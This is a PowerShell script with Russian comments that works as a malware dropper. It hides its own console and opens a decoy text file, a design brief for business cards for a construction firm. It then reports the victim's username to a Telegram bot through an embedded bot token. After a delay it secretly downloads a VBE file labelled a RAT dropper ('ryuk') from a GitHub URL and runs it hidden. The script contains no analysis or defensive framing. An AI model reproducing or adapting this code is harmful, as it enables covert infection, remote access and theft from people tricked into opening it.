# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "ТЗstroy.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Техническое заание — визитки для компании Профи Строй (Магнитогорск)

Кратко: требуется разработать комплект визиток для строительной компании Профи Строй (сайт: https://stroydom-mgn.ru/, местоположение — Магнитогорск). Формат — стандартная двусторонняя визитка. В результате — готовые макеты для печати и веб‑просмотра, исходники в векторном/растровом формате.

---

Варианты дизайна лицевой стороны (4 идеи)
Идея 1 — Логотип на фоне текстуры стройматериалов
- Логотип компании крупно в центре или смещённый влево; фон — тонкая текстура бетона/кирпича/металла (низкая контрастность, не мешает читаемости).
- Акцентный цвет из фирменной палитры; минималистичная типографика для названия.

Идея 2 — Логотип на паттерне инструментов
- Повторяющийся паттерн из силуэтов инструментов (молоток, уровень, рулетка) в тон‑в‑тоне; логотип и название на контрастной панели или круге.
- Подходит для узнаваемости и тематичности.

---

Варианты дизайна оборотной стороны (контактная информация)
Общие требования к обороту: читаемость при мелком шрифте, чёткая иерархия информации, иконки для контактов, учёт полей обрезки (bleed), возможность печати на светлом и тёмном фоне.

1. Классический список
- Верх: логотип в уменьшенном виде; ниже — блок с контактами в виде списка с иконками.
- Расположение: телефон, адрес, e‑mail; выравнивание слева.
- Иконки: простые монохромные пиктограммы.

2. Контактная карточка с акцентной полосой
- Левая/нижняя полоса акцентного цвета; справа — контактная информация в колонке.
- Телефон выделен крупнее; e‑mail и адрес — мелким, но читаемым шрифтом.


Контактная информация (для размещения):
- Контакты "Профи Строй"
- Телефон: +7 (995) 799-15-61
- Адрес: Советская улица, 72/1, Магнитогорск
- E‑mail: info@stroydom-mgn.ru

---

Технические требования и итоговые файлы
- Размер: 90×50 мм или 85×55 мм (уточнить перед печатью); поля обрезки (bleed) — 3 мм со всех сторон.
- Цветовая модель для печати: CMYK; для веб‑просмотра — RGB.
- Разрешение растровых элементов: 300 dpi.
- Шрифты: указать используемые шрифты и предоставить файлы/замены или кривые.
- Файлы на сдачу: исходники в AI или Figma (предпочтительно) и PSD при необходимости; печатный PDF (CMYK, 300 dpi, с bleed); PNG/JPG для веб‑просмотра (RGB, 300 dpi).
- Примечания: обеспечить контраст текста и фона, избегать мелких декоративных элементов, которые не читаются при уменьшении.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit